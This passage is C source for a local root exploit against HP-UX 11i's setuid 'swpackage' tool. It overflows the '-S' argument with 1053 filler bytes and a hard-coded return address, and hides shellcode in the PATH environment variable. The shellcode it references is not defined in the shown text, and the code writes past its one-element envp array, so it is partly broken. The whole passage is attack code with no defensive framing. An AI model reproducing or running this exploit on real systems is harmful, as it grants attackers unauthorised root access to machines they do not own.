int main(){
        char adr[4],*b,*a,*c,*envp[1];
        int i;
	*(unsigned long*)adr=0x7f7f0434;
	printf("[ HP-UX 11i 'swpackage' local root exploit\n");
        b=(char*)malloc(2048);
	a=b;
	memset(b,0,2048);
	memset(b,'a',1053);
	b+=1053;
        for(i=0;i<4;i++) *b++=adr[i%4];
	c=(char*)malloc(2048);
	b=c;
	memset(c,0,2048);
	sprintf(c,"PATH=");
	b+=5;
	for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
	envp[0]=c;
	envp[1]=0;
        execle("/usr/sbin/swpackage","swpackage","-S",a,0,envp);
}